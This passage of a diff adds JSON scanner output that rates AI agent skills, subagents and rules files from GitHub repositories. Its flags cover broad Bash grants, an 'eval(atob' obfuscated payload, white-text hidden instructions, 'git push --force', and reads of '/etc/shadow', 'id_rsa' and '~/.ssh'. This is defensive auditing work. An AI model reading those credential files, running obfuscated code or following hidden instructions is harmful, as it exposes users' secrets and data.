+            "en": "Overly broad tool grant"
+          },
+          "where": "body",
+          "line": 1,
+          "evidence": "allowed-tools: Bash(无约束)"
+        }
+      ]
+    },
+    {
+      "id": "skill:davila7/claude-code-templates:cli-tool/components/skills/security/xss-html-injection/skill.md#cross-site-scripting-and-html-injection-testing",
+      "name": "Cross-Site Scripting and HTML Injection Testing",
+      "type": "skill",
+      "repo": "davila7/claude-code-templates",
+      "path": "cli-tool/components/skills/security/xss-html-injection/SKILL.md",
+      "url": "https://github.com/davila7/claude-code-templates/blob/HEAD/cli-tool/components/skills/security/xss-html-injection/SKILL.md",
+      "level": "low",
+      "score": 10,
+      "counts": {
+        "high": 1
+      },
+      "flags": [
+        {
+          "id": "obfuscated-payload",
+          "severity": "high",
+          "title": {
+            "zh": "混淆载荷",
+            "en": "Obfuscated payload"
+          },
+          "where": "body",
+          "line": 319,
+          "evidence": "eval(atob"
+        }
+      ]
+    },
+    {
+      "id": "subagent:davila7/claude-code-templates:.claude/agents/build-checker.md#build-checker",
+      "name": "build-checker",
+      "type": "subagent",
+      "repo": "davila7/claude-code-templates",
+      "path": ".claude/agents/build-checker.md",
+      "url": "https://github.com/davila7/claude-code-templates/blob/HEAD/.claude/agents/build-checker.md",
+      "level": "low",
+      "score": 10,
+      "counts": {
+        "medium": 1
+      },
+      "flags": [
+        {
+          "id": "unrestricted-tools",
+          "severity": "medium",
+          "title": {
+            "zh": "工具权限过宽",
+            "en": "Overly broad tool grant"
+          },
+          "where": "body",
+          "line": 1,
+          "evidence": "allowed-tools: Bash(无约束)"
+        }
+      ]
+    },
+    {
+      "id": "subagent:davila7/claude-code-templates:.claude/agents/component-improver.md#component-improver",
+      "name": "component-improver",
+      "type": "subagent",
+      "repo": "davila7/claude-code-templates",
+      "path": ".claude/agents/component-improver.md",
+      "url": "https://github.com/davila7/claude-code-templates/blob/HEAD/.claude/agents/component-improver.md",
+      "level": "low",
+      "score": 10,
+      "counts": {
+        "medium": 1
+      },
+      "flags": [
+        {
+          "id": "unrestricted-tools",
+          "severity": "medium",
+          "title": {
+            "zh": "工具权限过宽",
+            "en": "Overly broad tool grant"
+          },
+          "where": "body",
+          "line": 1,
+          "evidence": "allowed-tools: Bash(无约束)"
+        }
+      ]
+    },
+    {
+      "id": "subagent:davila7/claude-code-templates:.claude/agents/component-migrator.md#component-migrator",
+      "name": "component-migrator",
+      "type": "subagent",
+      "repo": "davila7/claude-code-templates",
+      "path": ".claude/agents/component-migrator.md",
+      "url": "https://github.com/davila7/claude-code-templates/blob/HEAD/.claude/agents/component-migrator.md",
+      "level": "low",
+      "score": 10,
+      "counts": {
+        "medium": 1
+      },
+      "flags": [
+        {
+          "id": "unrestricted-tools",
+          "severity": "medium",
+          "title": {
+            "zh": "工具权限过宽",
+            "en": "Overly broad tool grant"
+          },
+          "where": "body",
+          "line": 1,
+          "evidence": "allowed-tools: Bash(无约束)"
+        }
+      ]
+    },
+    {
+      "id": "subagent:davila7/claude-code-templates:.claude/agents/docusaurus-expert.md#docusaurus-expert",
+      "name": "docusaurus-expert",
+      "type": "subagent",
+      "repo": "davila7/claude-code-templates",
+      "path": ".claude/agents/docusaurus-expert.md",
+      "url": "https://github.com/davila7/claude-code-templates/blob/HEAD/.claude/agents/docusaurus-expert.md",
+      "level": "low",
+      "score": 10,
+      "counts": {
+        "medium": 1
+      },
+      "flags": [
+        {
+          "id": "unrestricted-tools",
+          "severity": "medium",
+          "title": {
+            "zh": "工具权限过宽",
+            "en": "Overly broad tool grant"
+          },
+          "where": "body",
+          "line": 1,
+          "evidence": "allowed-tools: Bash(无约束)"
+        }
+      ]
+    },
+    {
+      "id": "subagent:davila7/claude-code-templates:.claude/agents/frontend-developer.md#frontend-developer",
+      "name": "frontend-developer",
+      "type": "subagent",
+      "repo": "davila7/claude-code-templates",
+      "path": ".claude/agents/frontend-developer.md",
+      "url": "https://github.com/davila7/claude-code-templates/blob/HEAD/.claude/agents/frontend-developer.md",
+      "level": "low",
+      "score": 10,
+      "counts": {
+        "medium": 1
+      },
+      "flags": [
+        {
+          "id": "unrestricted-tools",
+          "severity": "medium",
+          "title": {
+            "zh": "工具权限过宽",
+            "en": "Overly broad tool grant"
+          },
+          "where": "body",
+          "line": 1,
+          "evidence": "allowed-tools: Bash(无约束)"
+        }
+      ]
+    },
+    {
+      "id": "skill:dontbesilent2025/dbskill:skills/dbs-wechat-html/skill.md#dbs-wechat-html",
+      "name": "dbs-wechat-html",
+      "type": "skill",
+      "repo": "dontbesilent2025/dbskill",
+      "path": "skills/dbs-wechat-html/SKILL.md",
+      "url": "https://github.com/dontbesilent2025/dbskill/blob/HEAD/skills/dbs-wechat-html/SKILL.md",
+      "level": "low",
+      "score": 10,
+      "counts": {
+        "medium": 1
+      },
+      "flags": [
+        {
+          "id": "hidden-instruction",
+          "severity": "medium",
+          "title": {
+            "zh": "隐藏指令",
+            "en": "Hidden instruction"
+          },
+          "where": "body",
+          "line": 89,
+          "evidence": "白色隐藏文本样式:color:#ffffff"
+        }
+      ]
+    },
+    {
+      "id": "rules:sanjeed5/awesome-cursor-rules-mdc:rules-mdc/css.mdc#css",
+      "name": "css",
+      "type": "rules",
+      "repo": "sanjeed5/awesome-cursor-rules-mdc",
+      "path": "rules-mdc/css.mdc",
+      "url": "https://github.com/sanjeed5/awesome-cursor-rules-mdc/blob/HEAD/rules-mdc/css.mdc",
+      "level": "low",
+      "score": 10,
+      "counts": {
+        "medium": 1
+      },
+      "flags": [
+        {
+          "id": "hidden-instruction",
+          "severity": "medium",
+          "title": {
+            "zh": "隐藏指令",
+            "en": "Hidden instruction"
+          },
+          "where": "body",
+          "line": 86,
+          "evidence": "白色隐藏文本样式:color: white"
+        }
+      ]
+    },
+    {
+      "id": "rules:sanjeed5/awesome-cursor-rules-mdc:rules-mdc/git.mdc#git",
+      "name": "git",
+      "type": "rules",
+      "repo": "sanjeed5/awesome-cursor-rules-mdc",
+      "path": "rules-mdc/git.mdc",
+      "url": "https://github.com/sanjeed5/awesome-cursor-rules-mdc/blob/HEAD/rules-mdc/git.mdc",
+      "level": "low",
+      "score": 10,
+      "counts": {
+        "medium": 1
+      },
+      "flags": [
+        {
+          "id": "destructive-ops",
+          "severity": "medium",
+          "title": {
+            "zh": "破坏性操作",
+            "en": "Destructive operation"
+          },
+          "where": "body",
+          "line": 85,
+          "evidence": "git push --force"
+        }
+      ]
+    },
+    {
+      "id": "rules:sanjeed5/awesome-cursor-rules-mdc:rules-mdc/material-ui.mdc#material-ui",
+      "name": "material-ui",
+      "type": "rules",
+      "repo": "sanjeed5/awesome-cursor-rules-mdc",
+      "path": "rules-mdc/material-ui.mdc",
+      "url": "https://github.com/sanjeed5/awesome-cursor-rules-mdc/blob/HEAD/rules-mdc/material-ui.mdc",
+      "level": "low",
+      "score": 10,
+      "counts": {
+        "medium": 1
+      },
+      "flags": [
+        {
+          "id": "hidden-instruction",
+          "severity": "medium",
+          "title": {
+            "zh": "隐藏指令",
+            "en": "Hidden instruction"
+          },
+          "where": "body",
+          "line": 303,
+          "evidence": "白色隐藏文本样式:color: white"
+        }
+      ]
+    },
+    {
+      "id": "rules:sanjeed5/awesome-cursor-rules-mdc:rules-mdc/pyqt.mdc#pyqt",
+      "name": "pyqt",
+      "type": "rules",
+      "repo": "sanjeed5/awesome-cursor-rules-mdc",
+      "path": "rules-mdc/pyqt.mdc",
+      "url": "https://github.com/sanjeed5/awesome-cursor-rules-mdc/blob/HEAD/rules-mdc/pyqt.mdc",
+      "level": "low",
+      "score": 10,
+      "counts": {
+        "medium": 1
+      },
+      "flags": [
+        {
+          "id": "hidden-instruction",
+          "severity": "medium",
+          "title": {
+            "zh": "隐藏指令",
+            "en": "Hidden instruction"
+          },
+          "where": "body",
+          "line": 257,
+          "evidence": "白色隐藏文本样式:color: white"
+        }
+      ]
+    },
+    {
+      "id": "rules:sanjeed5/awesome-cursor-rules-mdc:rules-mdc/qwik.mdc#qwik",
+      "name": "qwik",
+      "type": "rules",
+      "repo": "sanjeed5/awesome-cursor-rules-mdc",
+      "path": "rules-mdc/qwik.mdc",
+      "url": "https://github.com/sanjeed5/awesome-cursor-rules-mdc/blob/HEAD/rules-mdc/qwik.mdc",
+      "level": "low",
+      "score": 10,
+      "counts": {
+        "medium": 1
+      },
+      "flags": [
+        {
+          "id": "hidden-instruction",
+          "severity": "medium",
+          "title": {
+            "zh": "隐藏指令",
+            "en": "Hidden instruction"
+          },
+          "where": "body",
+          "line": 264,
+          "evidence": "白色隐藏文本样式:color: white"
+        }
+      ]
+    },
+    {
+      "id": "rules:sanjeed5/awesome-cursor-rules-mdc:rules-mdc/solidjs.mdc#solidjs",
+      "name": "solidjs",
+      "type": "rules",
+      "repo": "sanjeed5/awesome-cursor-rules-mdc",
+      "path": "rules-mdc/solidjs.mdc",
+      "url": "https://github.com/sanjeed5/awesome-cursor-rules-mdc/blob/HEAD/rules-mdc/solidjs.mdc",
+      "level": "low",
+      "score": 10,
+      "counts": {
+        "medium": 1
+      },
+      "flags": [
+        {
+          "id": "hidden-instruction",
+          "severity": "medium",
+          "title": {
+            "zh": "隐藏指令",
+            "en": "Hidden instruction"
+          },
+          "where": "body",
+          "line": 36,
+          "evidence": "白色隐藏文本样式:color: white"
+        }
+      ]
+    },
+    {
+      "id": "rules:sanjeed5/awesome-cursor-rules-mdc:rules-mdc/turbopack.mdc#turbopack",
+      "name": "turbopack",
+      "type": "rules",
+      "repo": "sanjeed5/awesome-cursor-rules-mdc",
+      "path": "rules-mdc/turbopack.mdc",
+      "url": "https://github.com/sanjeed5/awesome-cursor-rules-mdc/blob/HEAD/rules-mdc/turbopack.mdc",
+      "level": "low",
+      "score": 10,
+      "counts": {
+        "medium": 1
+      },
+      "flags": [
+        {
+          "id": "hidden-instruction",
+          "severity": "medium",
+          "title": {
+            "zh": "隐藏指令",
+            "en": "Hidden instruction"
+          },
+          "where": "body",
+          "line": 259,
+          "evidence": "白色隐藏文本样式:color: white"
+        }
+      ]
+    },
+    {
+      "id": "skill:laolaoshiren/claude-code-skills-zh:skills/git-workflow/skill.md#git-workflow",
+      "name": "git-workflow",
+      "type": "skill",
+      "repo": "laolaoshiren/claude-code-skills-zh",
+      "path": "skills/git-workflow/SKILL.md",
+      "url": "https://github.com/laolaoshiren/claude-code-skills-zh/blob/HEAD/skills/git-workflow/SKILL.md",
+      "level": "low",
+      "score": 10,
+      "counts": {
+        "high": 1
+      },
+      "flags": [
+        {
+          "id": "destructive-ops",
+          "severity": "high",
+          "title": {
+            "zh": "破坏性操作",
+            "en": "Destructive operation"
+          },
+          "where": "body",
+          "line": 95,
+          "evidence": "git push --force"
+        }
+      ]
+    },
+    {
+      "id": "subagent:xu-xiang/everything-claude-code-zh:agents/build-error-resolver.md#build-error-resolver",
+      "name": "build-error-resolver",
+      "type": "subagent",
+      "repo": "xu-xiang/everything-claude-code-zh",
+      "path": "agents/build-error-resolver.md",
+      "url": "https://github.com/xu-xiang/everything-claude-code-zh/blob/HEAD/agents/build-error-resolver.md",
+      "level": "low",
+      "score": 10,
+      "counts": {
+        "medium": 1
+      },
+      "flags": [
+        {
+          "id": "unrestricted-tools",
+          "severity": "medium",
+          "title": {
+            "zh": "工具权限过宽",
+            "en": "Overly broad tool grant"
+          },
+          "where": "body",
+          "line": 1,
+          "evidence": "allowed-tools: Bash(无约束)"
+        }
+      ]
+    },
+    {
+      "id": "subagent:xu-xiang/everything-claude-code-zh:agents/chief-of-staff.md#chief-of-staff",
+      "name": "chief-of-staff",
+      "type": "subagent",
+      "repo": "xu-xiang/everything-claude-code-zh",
+      "path": "agents/chief-of-staff.md",
+      "url": "https://github.com/xu-xiang/everything-claude-code-zh/blob/HEAD/agents/chief-of-staff.md",
+      "level": "low",
+      "score": 10,
+      "counts": {
+        "medium": 1
+      },
+      "flags": [
+        {
+          "id": "unrestricted-tools",
+          "severity": "medium",
+          "title": {
+            "zh": "工具权限过宽",
+            "en": "Overly broad tool grant"
+          },
+          "where": "body",
+          "line": 1,
+          "evidence": "allowed-tools: Bash(无约束)"
+        }
+      ]
+    },
+    {
+      "id": "subagent:xu-xiang/everything-claude-code-zh:agents/doc-updater.md#doc-updater",
+      "name": "doc-updater",
+      "type": "subagent",
+      "repo": "xu-xiang/everything-claude-code-zh",
+      "path": "agents/doc-updater.md",
+      "url": "https://github.com/xu-xiang/everything-claude-code-zh/blob/HEAD/agents/doc-updater.md",
+      "level": "low",
+      "score": 10,
+      "counts": {
+        "medium": 1
+      },
+      "flags": [
+        {
+          "id": "unrestricted-tools",
+          "severity": "medium",
+          "title": {
+            "zh": "工具权限过宽",
+            "en": "Overly broad tool grant"
+          },
+          "where": "body",
+          "line": 1,
+          "evidence": "allowed-tools: Bash(无约束)"
+        }
+      ]
+    },
+    {
+      "id": "subagent:xu-xiang/everything-claude-code-zh:agents/e2e-runner.md#e2e-runner",
+      "name": "e2e-runner",
+      "type": "subagent",
+      "repo": "xu-xiang/everything-claude-code-zh",
+      "path": "agents/e2e-runner.md",
+      "url": "https://github.com/xu-xiang/everything-claude-code-zh/blob/HEAD/agents/e2e-runner.md",
+      "level": "low",
+      "score": 10,
+      "counts": {
+        "medium": 1
+      },
+      "flags": [
+        {
+          "id": "unrestricted-tools",
+          "severity": "medium",
+          "title": {
+            "zh": "工具权限过宽",
+            "en": "Overly broad tool grant"
+          },
+          "where": "body",
+          "line": 1,
+          "evidence": "allowed-tools: Bash(无约束)"
+        }
+      ]
+    },
+    {
+      "id": "subagent:xu-xiang/everything-claude-code-zh:agents/go-build-resolver.md#go-build-resolver",
+      "name": "go-build-resolver",
+      "type": "subagent",
+      "repo": "xu-xiang/everything-claude-code-zh",
+      "path": "agents/go-build-resolver.md",
+      "url": "https://github.com/xu-xiang/everything-claude-code-zh/blob/HEAD/agents/go-build-resolver.md",
+      "level": "low",
+      "score": 10,
+      "counts": {
+        "medium": 1
+      },
+      "flags": [
+        {
+          "id": "unrestricted-tools",
+          "severity": "medium",
+          "title": {
+            "zh": "工具权限过宽",
+            "en": "Overly broad tool grant"
+          },
+          "where": "body",
+          "line": 1,
+          "evidence": "allowed-tools: Bash(无约束)"
+        }
+      ]
+    },
+    {
+      "id": "subagent:xu-xiang/everything-claude-code-zh:agents/go-reviewer.md#go-reviewer",
+      "name": "go-reviewer",
+      "type": "subagent",
+      "repo": "xu-xiang/everything-claude-code-zh",
+      "path": "agents/go-reviewer.md",
+      "url": "https://github.com/xu-xiang/everything-claude-code-zh/blob/HEAD/agents/go-reviewer.md",
+      "level": "low",
+      "score": 10,
+      "counts": {
+        "medium": 1
+      },
+      "flags": [
+        {
+          "id": "unrestricted-tools",
+          "severity": "medium",
+          "title": {
+            "zh": "工具权限过宽",
+            "en": "Overly broad tool grant"
+          },
+          "where": "body",
+          "line": 1,
+          "evidence": "allowed-tools: Bash(无约束)"
+        }
+      ]
+    },
+    {
+      "id": "subagent:xu-xiang/everything-claude-code-zh:agents/tdd-guide.md#tdd-guide",
+      "name": "tdd-guide",
+      "type": "subagent",
+      "repo": "xu-xiang/everything-claude-code-zh",
+      "path": "agents/tdd-guide.md",
+      "url": "https://github.com/xu-xiang/everything-claude-code-zh/blob/HEAD/agents/tdd-guide.md",
+      "level": "low",
+      "score": 10,
+      "counts": {
+        "medium": 1
+      },
+      "flags": [
+        {
+          "id": "unrestricted-tools",
+          "severity": "medium",
+          "title": {
+            "zh": "工具权限过宽",
+            "en": "Overly broad tool grant"
+          },
+          "where": "body",
+          "line": 1,
+          "evidence": "allowed-tools: Bash(无约束)"
+        }
+      ]
+    },
+    {
+      "id": "subagent:joneqian/claude-skills-suite:agents/build-error-resolver.md#build-error-resolver",
+      "name": "build-error-resolver",
+      "type": "subagent",
+      "repo": "joneqian/claude-skills-suite",
+      "path": "agents/build-error-resolver.md",
+      "url": "https://github.com/joneqian/claude-skills-suite/blob/HEAD/agents/build-error-resolver.md",
+      "level": "low",
+      "score": 10,
+      "counts": {
+        "medium": 1
+      },
+      "flags": [
+        {
+          "id": "unrestricted-tools",
+          "severity": "medium",
+          "title": {
+            "zh": "工具权限过宽",
+            "en": "Overly broad tool grant"
+          },
+          "where": "body",
+          "line": 1,
+          "evidence": "allowed-tools: Bash(无约束)"
+        }
+      ]
+    },
+    {
+      "id": "subagent:joneqian/claude-skills-suite:agents/doc-updater.md#doc-updater",
+      "name": "doc-updater",
+      "type": "subagent",
+      "repo": "joneqian/claude-skills-suite",
+      "path": "agents/doc-updater.md",
+      "url": "https://github.com/joneqian/claude-skills-suite/blob/HEAD/agents/doc-updater.md",
+      "level": "low",
+      "score": 10,
+      "counts": {
+        "medium": 1
+      },
+      "flags": [
+        {
+          "id": "unrestricted-tools",
+          "severity": "medium",
+          "title": {
+            "zh": "工具权限过宽",
+            "en": "Overly broad tool grant"
+          },
+          "where": "body",
+          "line": 1,
+          "evidence": "allowed-tools: Bash(无约束)"
+        }
+      ]
+    },
+    {
+      "id": "subagent:joneqian/claude-skills-suite:agents/e2e-runner.md#e2e-runner",
+      "name": "e2e-runner",
+      "type": "subagent",
+      "repo": "joneqian/claude-skills-suite",
+      "path": "agents/e2e-runner.md",
+      "url": "https://github.com/joneqian/claude-skills-suite/blob/HEAD/agents/e2e-runner.md",
+      "level": "low",
+      "score": 10,
+      "counts": {
+        "medium": 1
+      },
+      "flags": [
+        {
+          "id": "unrestricted-tools",
+          "severity": "medium",
+          "title": {
+            "zh": "工具权限过宽",
+            "en": "Overly broad tool grant"
+          },
+          "where": "body",
+          "line": 1,
+          "evidence": "allowed-tools: Bash(无约束)"
+        }
+      ]
+    },
+    {
+      "id": "subagent:joneqian/claude-skills-suite:agents/product-manager.md#product-manager",
+      "name": "product-manager",
+      "type": "subagent",
+      "repo": "joneqian/claude-skills-suite",
+      "path": "agents/product-manager.md",
+      "url": "https://github.com/joneqian/claude-skills-suite/blob/HEAD/agents/product-manager.md",
+      "level": "low",
+      "score": 10,
+      "counts": {
+        "medium": 1
+      },
+      "flags": [
+        {
+          "id": "unrestricted-tools",
+          "severity": "medium",
+          "title": {
+            "zh": "工具权限过宽",
+            "en": "Overly broad tool grant"
+          },
+          "where": "body",
+          "line": 1,
+          "evidence": "allowed-tools: Bash(无约束)"
+        }
+      ]
+    },
+    {
+      "id": "subagent:joneqian/claude-skills-suite:agents/refactor-cleaner.md#refactor-cleaner",
+      "name": "refactor-cleaner",
+      "type": "subagent",
+      "repo": "joneqian/claude-skills-suite",
+      "path": "agents/refactor-cleaner.md",
+      "url": "https://github.com/joneqian/claude-skills-suite/blob/HEAD/agents/refactor-cleaner.md",
+      "level": "low",
+      "score": 10,
+      "counts": {
+        "medium": 1
+      },
+      "flags": [
+        {
+          "id": "unrestricted-tools",
+          "severity": "medium",
+          "title": {
+            "zh": "工具权限过宽",
+            "en": "Overly broad tool grant"
+          },
+          "where": "body",
+          "line": 1,
+          "evidence": "allowed-tools: Bash(无约束)"
+        }
+      ]
+    },
+    {
+      "id": "subagent:joneqian/claude-skills-suite:agents/tdd-guide.md#tdd-guide",
+      "name": "tdd-guide",
+      "type": "subagent",
+      "repo": "joneqian/claude-skills-suite",
+      "path": "agents/tdd-guide.md",
+      "url": "https://github.com/joneqian/claude-skills-suite/blob/HEAD/agents/tdd-guide.md",
+      "level": "low",
+      "score": 10,
+      "counts": {
+        "medium": 1
+      },
+      "flags": [
+        {
+          "id": "unrestricted-tools",
+          "severity": "medium",
+          "title": {
+            "zh": "工具权限过宽",
+            "en": "Overly broad tool grant"
+          },
+          "where": "body",
+          "line": 1,
+          "evidence": "allowed-tools: Bash(无约束)"
+        }
+      ]
+    },
+    {
+      "id": "subagent:joneqian/claude-skills-suite:agents/ui-ux-designer.md#ui-ux-designer",
+      "name": "ui-ux-designer",
+      "type": "subagent",
+      "repo": "joneqian/claude-skills-suite",
+      "path": "agents/ui-ux-designer.md",
+      "url": "https://github.com/joneqian/claude-skills-suite/blob/HEAD/agents/ui-ux-designer.md",
+      "level": "low",
+      "score": 10,
+      "counts": {
+        "medium": 1
+      },
+      "flags": [
+        {
+          "id": "unrestricted-tools",
+          "severity": "medium",
+          "title": {
+            "zh": "工具权限过宽",
+            "en": "Overly broad tool grant"
+          },
+          "where": "body",
+          "line": 1,
+          "evidence": "allowed-tools: Bash(无约束)"
+        }
+      ]
+    },
+    {
+      "id": "subagent:joneqian/claude-skills-suite:agents/vue3-frontend-developer.md#vue3-frontend-developer",
+      "name": "vue3-frontend-developer",
+      "type": "subagent",
+      "repo": "joneqian/claude-skills-suite",
+      "path": "agents/vue3-frontend-developer.md",
+      "url": "https://github.com/joneqian/claude-skills-suite/blob/HEAD/agents/vue3-frontend-developer.md",
+      "level": "low",
+      "score": 10,
+      "counts": {
+        "medium": 1
+      },
+      "flags": [
+        {
+          "id": "unrestricted-tools",
+          "severity": "medium",
+          "title": {
+            "zh": "工具权限过宽",
+            "en": "Overly broad tool grant"
+          },
+          "where": "body",
+          "line": 1,
+          "evidence": "allowed-tools: Bash(无约束)"
+        }
+      ]
+    },
+    {
+      "id": "skill:davila7/claude-code-templates:cli-tool/components/skills/security/vulnerability-scanner/skill.md#vulnerability-scanner",
+      "name": "vulnerability-scanner",
+      "type": "skill",
+      "repo": "davila7/claude-code-templates",
+      "path": "cli-tool/components/skills/security/vulnerability-scanner/SKILL.md",
+      "url": "https://github.com/davila7/claude-code-templates/blob/HEAD/cli-tool/components/skills/security/vulnerability-scanner/SKILL.md",
+      "level": "low",
+      "score": 8,
+      "counts": {
+        "medium": 2
+      },
+      "flags": [
+        {
+          "id": "unrestricted-tools",
+          "severity": "medium",
+          "title": {
+            "zh": "工具权限过宽",
+            "en": "Overly broad tool grant"
+          },
+          "where": "body",
+          "line": 1,
+          "evidence": "allowed-tools: Bash(无约束)"
+        },
+        {
+          "id": "unrestricted-tools",
+          "severity": "medium",
+          "title": {
+            "zh": "工具权限过宽",
+            "en": "Overly broad tool grant"
+          },
+          "where": "script",
+          "line": 1,
+          "evidence": "allowed-tools: Bash(无约束)"
+        }
+      ]
+    },
+    {
+      "id": "skill:davila7/claude-code-templates:cli-tool/components/skills/pocketbase/pb-deploy/skill.md#pocketbase-deploy",
+      "name": "PocketBase Deploy",
+      "type": "skill",
+      "repo": "davila7/claude-code-templates",
+      "path": "cli-tool/components/skills/pocketbase/pb-deploy/SKILL.md",
+      "url": "https://github.com/davila7/claude-code-templates/blob/HEAD/cli-tool/components/skills/pocketbase/pb-deploy/SKILL.md",
+      "level": "low",
+      "score": 8,
+      "counts": {
+        "low": 2
+      },
+      "flags": [
+        {
+          "id": "raw-endpoint",
+          "severity": "low",
+          "title": {
+            "zh": "裸 IP 或短链接端点",
+            "en": "Raw IP / shortener endpoint"
+          },
+          "where": "body",
+          "line": 182,
+          "evidence": "http://127.0.0.1:8090;"
+        },
+        {
+          "id": "persistence-write",
+          "severity": "low",
+          "title": {
+            "zh": "写入自启动/持久化位置",
+            "en": "Writes to autorun / persistence location"
+          },
+          "where": "body",
+          "line": 61,
+          "evidence": "systemctl enable"
+        }
+      ]
+    },
+    {
+      "id": "skill:davila7/claude-code-templates:cli-tool/components/skills/security/file-path-traversal/skill.md#file-path-traversal-testing",
+      "name": "File Path Traversal Testing",
+      "type": "skill",
+      "repo": "davila7/claude-code-templates",
+      "path": "cli-tool/components/skills/security/file-path-traversal/SKILL.md",
+      "url": "https://github.com/davila7/claude-code-templates/blob/HEAD/cli-tool/components/skills/security/file-path-traversal/SKILL.md",
+      "level": "low",
+      "score": 8,
+      "counts": {
+        "medium": 5
+      },
+      "flags": [
+        {
+          "id": "credential-file-access",
+          "severity": "medium",
+          "title": {
+            "zh": "触碰凭证文件",
+            "en": "Credential file access"
+          },
+          "where": "body",
+          "line": 118,
+          "evidence": "/etc/shadow"
+        },
+        {
+          "id": "credential-file-access",
+          "severity": "medium",
+          "title": {
+            "zh": "触碰凭证文件",
+            "en": "Credential file access"
+          },
+          "where": "body",
+          "line": 198,
+          "evidence": "/etc/shadow"
+        },
+        {
+          "id": "credential-file-access",
+          "severity": "medium",
+          "title": {
+            "zh": "触碰凭证文件",
+            "en": "Credential file access"
+          },
+          "where": "body",
+          "line": 205,
+          "evidence": "id_rsa"
+        },
+        {
+          "id": "credential-file-access",
+          "severity": "medium",
+          "title": {
+            "zh": "触碰凭证文件",
+            "en": "Credential file access"
+          },
+          "where": "body",
+          "line": 207,
+          "evidence": "id_rsa"
+        },
+        {
+          "id": "credential-file-access",
+          "severity": "medium",
+          "title": {
+            "zh": "触碰凭证文件",
+            "en": "Credential file access"
+          },
+          "where": "body",
+          "line": 260,
+          "evidence": "id_rsa"
+        }
+      ]
+    },
+    {
+      "id": "skill:davila7/claude-code-templates:cli-tool/components/skills/security/ssh-penetration-testing/skill.md#ssh-penetration-testing",
+      "name": "SSH Penetration Testing",
+      "type": "skill",
+      "repo": "davila7/claude-code-templates",
+      "path": "cli-tool/components/skills/security/ssh-penetration-testing/SKILL.md",
+      "url": "https://github.com/davila7/claude-code-templates/blob/HEAD/cli-tool/components/skills/security/ssh-penetration-testing/SKILL.md",
+      "level": "low",
+      "score": 8,
+      "counts": {
+        "medium": 4
+      },
+      "flags": [
+        {
+          "id": "credential-file-access",
+          "severity": "medium",
+          "title": {
+            "zh": "触碰凭证文件",
+            "en": "Credential file access"
+          },
+          "where": "body",
+          "line": 159,
+          "evidence": "id_rsa"
+        },
+        {
+          "id": "credential-file-access",
+          "severity": "medium",
+          "title": {
+            "zh": "触碰凭证文件",
+            "en": "Credential file access"
+          },
+          "where": "body",
+          "line": 162,
+          "evidence": "id_rsa"
+        },
+        {
+          "id": "credential-file-access",
+          "severity": "medium",
+          "title": {
+            "zh": "触碰凭证文件",
+            "en": "Credential file access"
+          },
+          "where": "body",
+          "line": 168,
+          "evidence": "id_rsa"
+        },
+        {
+          "id": "credential-file-access",
+          "severity": "medium",
+          "title": {
+            "zh": "触碰凭证文件",
+            "en": "Credential file access"
+          },
+          "where": "body",
+          "line": 177,
+          "evidence": "~/.ssh"
+        }
+      ]
+    },
+    {
+      "id": "skill:davila7/claude-code-templates:cli-tool/components/skills/utilities/network-101/skill.md#network-101",
+      "name": "Network 101",
+      "type": "skill",
+      "repo": "davila7/claude-code-templates",
+      "path": "cli-tool/components/skills/utilities/network-101/SKILL.md",
+      "url": "https://github.com/davila7/claude-code-templates/blob/HEAD/cli-tool/components/skills/utilities/network-101/SKILL.md",
+      "level": "low",
+      "score": 8,
+      "counts": {
+        "low": 2
+      },
+      "flags": [
+        {
+          "id": "raw-endpoint",
+          "severity": "low",
+          "title": {
+            "zh": "裸 IP 或短链接端点",
+            "en": "Raw IP / shortener endpoint"
+          },
+          "where": "body",
+          "line": 101,
+          "evidence": "https://192.168.1.1"
+        },
+        {
+          "id": "persistence-write",
+          "severity": "low",
+          "title": {
+            "zh": "写入自启动/持久化位置",
+            "en": "Writes to autorun / persistence location"
+          },
+          "where": "body",
+          "line": 44,
+          "evidence": "systemctl enable"
+        }
+      ]
+    },
+    {
+      "id": "skill:dontbesilent2025/dbskill:skills/dbs-skill-cleaner/skill.md#dbs-skill-cleaner",
+      "name": "dbs-skill-cleaner",
+      "type": "skill",
+      "repo": "dontbesilent2025/dbskill",
+      "path": "skills/dbs-skill-cleaner/SKILL.md",
+      "url": "https://github.com/dontbesilent2025/dbskill/blob/HEAD/skills/dbs-skill-cleaner/SKILL.md",
+      "level": "low",
+      "score": 8,
+      "counts": {
+        "low": 2
+      },
+      "flags": [
+        {
+          "id": "contact-solicitation",
+          "severity": "low",
+          "title": {
+            "zh": "导流联系方式",
+            "en": "Contact solicitation"
+          },
+          "where": "body",
+          "line": 54,
+          "evidence": "加微信"
+        },
+        {
+          "id": "contact-solicitation",
+          "severity": "low",
+          "title": {
+            "zh": "导流联系方式",
+            "en": "Contact solicitation"
+          },
+          "where": "script",
+          "line": 22,
+          "evidence": "加微信"
+        }
+      ]
+    },
+    {
+      "id": "skill:davila7/claude-code-templates:cli-tool/components/skills/ai-research/post-training-openrlhf/skill.md#openrlhf-training",
+      "name": "openrlhf-training",
+      "type": "skill",
+      "repo": "davila7/claude-code-templates",
+      "path": "cli-tool/components/skills/ai-research/post-training-openrlhf/SKILL.md",
+      "url": "https://github.com/davila7/claude-code-templates/blob/HEAD/cli-tool/components/skills/ai-research/post-training-openrlhf/SKILL.md",
+      "level": "low",
+      "score": 7,
+      "counts": {
+        "low": 3
+      },
+      "flags": [
+        {
+          "id": "raw-endpoint",
+          "severity": "low",
+          "title": {
+            "zh": "裸 IP 或短链接端点",
+            "en": "Raw IP / shortener endpoint"
+          },
+          "where": "body",
+          "line": 25,
+          "evidence": "http://127.0.0.1:8265\""
+        },
+        {
+          "id": "raw-endpoint",
+          "severity": "low",
+          "title": {
+            "zh": "裸 IP 或短链接端点",
+            "en": "Raw IP / shortener endpoint"
+          },
+          "where": "body",
+          "line": 76,
+          "evidence": "http://127.0.0.1:8265\""
+        },
+        {
+          "id": "raw-endpoint",
+          "severity": "low",
+          "title": {
+            "zh": "裸 IP 或短链接端点",
+            "en": "Raw IP / shortener endpoint"
+          },
+          "where": "body",
+          "line": 101,
+          "evidence": "http://127.0.0.1:8265\""
+        }
+      ]
+    },
+    {
+      "id": "skill:davila7/claude-code-templates:cli-tool/components/skills/security/pentest-commands/skill.md#pentest-commands",
+      "name": "Pentest Commands",
+      "type": "skill",
+      "repo": "davila7/claude-code-templates",
+      "path": "cli-tool/components/skills/security/pentest-commands/SKILL.md",
+      "url": "https://github.com/davila7/claude-code-templates/blob/HEAD/cli-tool/components/skills/security/pentest-commands/SKILL.md",
+      "level": "low",
+      "score": 7,
+      "counts": {
+        "medium": 1,
+        "low": 5
+      },
+      "flags": [
+        {
+          "id": "credential-file-access",
+          "severity": "medium",
